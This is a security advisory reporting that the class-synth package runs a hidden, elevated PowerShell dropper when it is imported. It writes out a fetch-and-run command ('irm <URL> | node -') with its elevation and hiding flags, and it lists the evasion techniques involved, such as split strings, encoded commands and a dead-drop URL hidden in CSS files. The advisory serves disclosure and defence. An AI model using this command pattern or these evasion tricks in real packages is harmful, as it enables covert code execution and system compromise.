summary: class-synth executes elevated PowerShell dropper on import, fetching and running remote JavaScript
details: On require()/import under Node on Windows, class-synth runs an async IIFE that recursively scans the consumer's working directory for.css files containing an `@sri-hash:` comment, AES-256-CBC-decrypts the base64 blob with a hardcoded key (assembled from eight hex fragments via Array.join) into a URL, then spawns a hidden, elevated PowerShell process via `Start-Process... -Verb RunAs -WindowStyle Hidden -EncodedCommand <UTF16-LE base64>` running `irm <URL> | node -` to execute attacker-controlled JavaScript with the user's elevated privileges. Multiple evasion techniques are present: the string `powershell.exe` is split as `['power','shell','.exe'].join('')`; the command is UTF16-LE base64-encoded; the spawned process is detached and hidden; the URL is delivered via a dead-drop in any CSS file in the project tree, allowing the attacker to rotate destinations without re-publishing the package. Function names like `__cssCompatInit` and the `@sri-hash:` marker masquerade as CSS Subresource Integrity tooling. Triggering only requires importing the package on a Windows host where any reachable.css file carries the attacker's encoded marker — a UAC prompt is the only friction before full system compromise.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
